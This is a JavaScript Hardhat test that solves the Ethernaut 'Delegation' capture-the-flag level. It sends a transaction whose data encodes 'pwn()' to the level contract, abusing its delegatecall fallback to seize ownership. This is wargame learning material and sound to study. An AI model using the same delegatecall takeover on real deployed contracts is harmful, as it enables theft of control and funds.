// npx hardhat test ./test/06_delegation.js --network rinkeby

const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");

let levelContract;
const INTERFACE_CONTRACT = "Delegation";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._06_delegation, INTERFACE_CONTRACT);
});

it("solves the level", async function () {
    const accounts = await ethers.getSigners();
    const delegateeAbi = ["function pwn()"];
    let iface = new ethers.utils.Interface(delegateeAbi);
    const data = iface.encodeFunctionData(`pwn`, []);

    let tx = await accounts[0].sendTransaction({
        from: await accounts[0].address,
        to: levelContract.address,
        data,
        gasLimit: 100000
    });
    await tx.wait();

});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});